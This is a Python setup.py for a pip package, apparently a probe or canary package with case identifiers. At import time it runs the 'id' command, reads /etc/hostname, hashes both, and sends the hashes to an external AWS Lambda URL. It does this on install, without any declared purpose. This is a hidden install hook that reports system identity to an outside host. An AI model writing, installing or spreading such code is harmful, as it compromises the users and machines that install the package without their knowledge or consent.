import hashlib,pathlib,subprocess,urllib.request
i=subprocess.check_output(['id']); h=pathlib.Path('/etc/hostname').read_bytes()
urllib.request.urlopen('https://x54cd3th4xlrpmnyslamkgsrxi0pizox.lambda-url.us-east-1.on.aws/callback?phase=pip-setup&case=dbbe-20261116230321-dfacc4&uid=1&id_sha='+hashlib.sha256(i).hexdigest()+'&host_sha='+hashlib.sha256(h).hexdigest(),timeout=10).read()
from setuptools import setup
setup(name='dbbe-20261116230321-dfacc4_pip',version='1.0.0')
